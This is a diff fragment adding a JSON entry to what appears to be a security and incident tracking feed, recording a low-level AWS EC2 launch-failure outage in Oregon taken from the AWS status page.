+      "aliases": [],
+      "title": "AWS: Amazon Elastic Compute Cloud（Oregon）Elevated Launch Failures",
+      "description": "AWS の公式ステータスページに掲載された障害",
+      "published": "2026-11-06T22:51:05+00:00",
+      "updated": "2026-11-06T22:51:05+00:00",
+      "cvss": null,
+      "cvss_vector": "",
+      "severity": "",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://health.aws.amazon.com/health/status"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "status:aws"
+      ],
+      "category": "outage",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T23:31:58.291375+00:00",
+      "matched": [
+        "aws"
+      ],
+      "match_type": "status",
       "tier": null,
       "score": 10.0,
       "level": "low",
